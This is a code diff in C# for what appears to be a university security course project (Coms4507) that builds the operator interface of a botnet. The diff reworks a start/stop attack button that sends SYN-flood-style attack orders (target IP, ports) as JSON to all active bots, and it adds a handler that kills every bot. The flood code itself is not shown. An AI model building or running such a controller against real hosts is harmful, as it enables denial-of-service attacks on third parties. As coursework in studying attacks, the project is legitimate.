@@ -148,11 +148,6 @@ namespace Coms4507_Project
             task.Start();
         }
 
-        private string FormatPorts(string portNumbers)
-        {
-            return "[" + portNumbers.Trim() + "]";
-        }
-
         private void SYN_FLOOD_Click(object sender, System.Windows.RoutedEventArgs e)
         {
             // SELECT SYN_FLOOD TO THE ATTACK TYPE
@@ -223,32 +218,82 @@ namespace Coms4507_Project
         private void ATTACK_BUTTON_Click(object sender, System.Windows.RoutedEventArgs e)
         {
             // THIS IS WHERE WE START THE ATTACK.
+            if (ATTACK_BUTTON.Content.ToString().Equals("START ATTACK"))
+            {
+                ATTACK_BUTTON.Background = new SolidColorBrush(Colors.Gray);
+                ATTACK_BUTTON.Content = "STARTING ATTACK";
 
-            ATTACK_BUTTON.Background = new SolidColorBrush(Colors.Gray);
-            ATTACK_BUTTON.Content = "STARTING ATTACK";
+                // Format the attack, and then mass distribute it out to all active bots.
 
-            // Format the attack, and then mass distribute it out to all active bots.
+                string targetIp = IP_ADDRESS.Text;
+                string ports = PORTS.Text;
+                string runtime = "*"; // Deprecated: hardcoded because we don't support runtimes anymore but the APIs use it.
 
-            string targetIp = IP_ADDRESS.Text;
-            string ports = PORTS.Text;
-            string runtime = "*"; // Deprecated: hardcoded because we don't support runtimes anymore but the APIs use it.
+                Dictionary<string, string> attackMessage = new Dictionary<string, string>
+                {
+                    { "request", "attack" },
+                    { "attack", attackType },
+                    { "targetIP", targetIp },
+                    { "ports", "[" + ports.Trim() + "]" },
+                    { "runtime", runtime }
+                };
+
+                attackStatus = "ATTACK";
+                botHandler.ATTACK(JObject.FromObject(attackMessage).ToString());
+                // Modify the ViewModel
+                TARGET_STATUS.Content = "UNDER ATTACK!";
+                TARGET_STATUS.Foreground = new SolidColorBrush(Colors.Orange);
+                ATTACK_BUTTON.Background = new SolidColorBrush(Colors.LawnGreen);
+                ATTACK_BUTTON.Content = "STOP ATTACK";
+            } else
+            {
+                ATTACK_BUTTON.Content = "STOPPING ATTACK";
+                ATTACK_BUTTON.Background = new SolidColorBrush(Colors.Gray);
+                TARGET_STATUS.Content = "ONLINE? (Cannot confirm)";
+                TARGET_STATUS.Foreground = new SolidColorBrush(Colors.White);
+                // Issue the stop order
+                Dictionary<string, string> attackMessage = new Dictionary<string, string>
+                {
+                    { "request", "stop" },
+                    { "attack", "none" },
+                    { "targetIP", "none" },
+                    { "ports", "none" },
+                    { "runtime", "*" }
+                };
+                // Tell them to stop.
+                botHandler.STOP(JObject.FromObject(attackMessage).ToString());
+
+                ATTACK_BUTTON.Content = "START ATTACK";
+                ATTACK_BUTTON.Background = new SolidColorBrush(Colors.Red);
+            }
+            
+        }
+
+
+        /// <summary>
+        /// This is the final nail in the coffin. This will kill all active bots.
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void KILL_BOTS_Click(object sender, RoutedEventArgs e)
+        {
+            // THIS WILL ISSUE THE BOTS TO PERMANENTLY KILL ALL BOTS ON THE NETWORK.
+            foreach (string botName in botHandler.botIpPortDetails.Keys)
+            {
+                Label label = FindName($"{botName}_STATUS") as Label;
+                label.Content = "DEAD";
+                label.Foreground = new SolidColorBrush(Colors.Orange);
+            }
 
             Dictionary<string, string> attackMessage = new Dictionary<string, string>
             {
-                { "request", "attack" },
-                { "attack", attackType },
-                { "targetIP", targetIp },
-                { "ports", "[" + ports.Trim() + "]" },
-                { "runtime", runtime }
+                { "request", "kill" },
+                { "attack", "none" },
+                { "targetIP", "none" },
+                { "ports", "none" },
+                { "runtime", "*" }
             };
-
-            attackStatus = "ATTACK";
-            botHandler.ATTACK(JObject.FromObject(attackMessage).ToString());
-
-            ATTACK_BUTTON.Background = new SolidColorBrush(Colors.LawnGreen);
-            ATTACK_BUTTON.Content = "STOP ATTACK";
+            botHandler.KILL(JObject.FromObject(attackMessage).ToString());
         }
-
-        
     }
 }
